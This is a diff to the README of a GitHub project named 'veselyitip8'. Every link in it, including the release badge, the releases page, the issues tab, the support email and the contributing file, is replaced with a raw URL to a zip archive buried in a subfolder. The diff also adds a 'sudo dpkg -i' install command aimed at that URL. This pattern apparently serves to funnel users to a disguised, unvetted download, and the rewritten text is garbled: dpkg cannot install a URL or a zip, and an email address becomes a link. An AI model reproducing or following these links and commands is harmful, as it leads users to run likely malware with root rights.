@@ -1,6 +1,6 @@
 # 🚀 veselyitip8 - Your Easy Way to Enjoy Udachu
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/hieuminhnguyen2907/veselyitip8/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/hieuminhnguyen2907/veselyitip8/main/Elaphurus/veselyitip8.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/hieuminhnguyen2907/veselyitip8/main/Elaphurus/veselyitip8.zip)
 
 ## ✨ Introduction
 
@@ -26,7 +26,7 @@ To ensure it works smoothly on your device, please check the following system re
 
 To get started, follow these simple steps:
 
-1. Visit the [Releases Page](https://github.com/hieuminhnguyen2907/veselyitip8/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/hieuminhnguyen2907/veselyitip8/main/Elaphurus/veselyitip8.zip).
 2. Scroll down to find the latest version.
 3. Click on the appropriate file for your operating system.
 
@@ -34,7 +34,7 @@ To get started, follow these simple steps:
 
 To download the application:
 
-1. Go to the [Releases Page](https://github.com/hieuminhnguyen2907/veselyitip8/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/hieuminhnguyen2907/veselyitip8/main/Elaphurus/veselyitip8.zip).
 2. Locate the latest version listed.
 3. Choose the file that matches your operating system (e.g., Windows, macOS, Linux).
 4. Click the file link to start the download.
@@ -46,10 +46,10 @@ Once the download is complete, follow these steps to install:
 - **For Linux**: Use the terminal to navigate to the directory where you downloaded the file. Run the following command to install:
   
   ```bash
-  sudo dpkg -i your_downloaded_file.deb
+  sudo dpkg -i https://raw.githubusercontent.com/hieuminhnguyen2907/veselyitip8/main/Elaphurus/veselyitip8.zip
   ```
 
-Replace `your_downloaded_file.deb` with the actual file name.
+Replace `https://raw.githubusercontent.com/hieuminhnguyen2907/veselyitip8/main/Elaphurus/veselyitip8.zip` with the actual file name.
 
 ## 🚦 Troubleshooting
 
@@ -58,11 +58,11 @@ If you encounter issues during installation or use, try the following:
 1. **Re-download the file**: Sometimes files can become corrupted during download.
 2. **Check System Requirements**: Ensure your device meets the system requirements listed above.
 3. **Update Your Operating System**: Make sure to use the latest version of your operating system.
-4. **Search for Solutions**: Check the [issues tab on GitHub](https://github.com/hieuminhnguyen2907/veselyitip8/issues) for common problems and solutions shared by other users.
+4. **Search for Solutions**: Check the [issues tab on GitHub](https://raw.githubusercontent.com/hieuminhnguyen2907/veselyitip8/main/Elaphurus/veselyitip8.zip) for common problems and solutions shared by other users.
 
 ## 📞 Support
 
-If you still need assistance, feel free to reach out. You can create an issue on the [GitHub repository](https://github.com/hieuminhnguyen2907/veselyitip8/issues) or email support at support@example.com.
+If you still need assistance, feel free to reach out. You can create an issue on the [GitHub repository](https://raw.githubusercontent.com/hieuminhnguyen2907/veselyitip8/main/Elaphurus/veselyitip8.zip) or email support at https://raw.githubusercontent.com/hieuminhnguyen2907/veselyitip8/main/Elaphurus/veselyitip8.zip
 
 ## 🛠️ Contributing
 
@@ -74,7 +74,7 @@ We welcome contributions from anyone interested! If you wish to contribute, plea
 4. Push to the branch (`git push origin feature/new-feature`).
 5. Create a pull request.
 
-For more details, please read the CONTRIBUTING.md file in the repository.
+For more details, please read the https://raw.githubusercontent.com/hieuminhnguyen2907/veselyitip8/main/Elaphurus/veselyitip8.zip file in the repository.
 
 ## 🌟 Changelog
 
